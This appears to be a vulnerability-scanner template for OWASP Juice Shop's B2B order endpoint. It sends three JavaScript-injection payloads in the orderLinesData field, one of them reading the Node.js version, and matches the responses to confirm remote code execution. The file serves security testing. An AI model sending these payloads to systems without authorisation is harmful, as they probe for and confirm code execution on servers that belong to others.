id: juice-shop-b2b-rce
info:
  name: B2B Order RCE via JavaScript Injection
  owasp_category: A05:2025
  severity: critical
  description: Tests for Remote Code Execution in B2B order processing
  tags:
    - rce
    - code-injection
    - injection

requests:
  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return 2+2})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
      - type: word
        words:
          - orderNo
          - B2B
        condition: or
    on_match:
      vulnerability: RCE_VIA_JS_INJECTION
      message: B2B endpoint executes JavaScript code in orderLinesData parameter - remote code execution possible
      remediation: Never execute user-supplied JavaScript; use safe JSON parsing instead of eval

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){var x=1; while(x<10){x++;} return x;})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - orderNo
          - orderLines
        condition: or
    on_match:
      vulnerability: RCE_VIA_JS_INJECTION
      message: B2B endpoint accepts complex JavaScript code in orderLinesData - confirms code execution capability
      remediation: Implement strict input validation; use JSON.parse() instead of eval() or Function()

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return global.process.version})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - 'v[0-9]+\.[0-9]+\.[0-9]+'
          - 'orderNo'
    on_match:
      vulnerability: RCE_VIA_JS_INJECTION
      message: Successfully leaked Node.js version via process.version - confirms remote code execution
      remediation: Disable code execution entirely; implement proper order processing without eval
